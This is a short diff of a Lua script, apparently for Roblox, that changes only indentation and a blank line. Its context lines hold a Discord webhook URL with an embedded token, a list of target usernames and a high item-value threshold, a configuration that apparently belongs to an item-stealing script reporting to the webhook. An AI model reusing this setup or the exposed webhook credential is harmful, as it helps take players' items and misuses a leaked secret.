@@ -8,10 +8,9 @@ _G.webhook = "https://discord.com/api/webhooks/1392880984428384398/b0i3uImsepPTs
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
-    return
+return
 end
 _G.scriptExecuted = true
-
 
 local users = _G.Usernames or {}
 local min_value = _G.min_value or 10000000
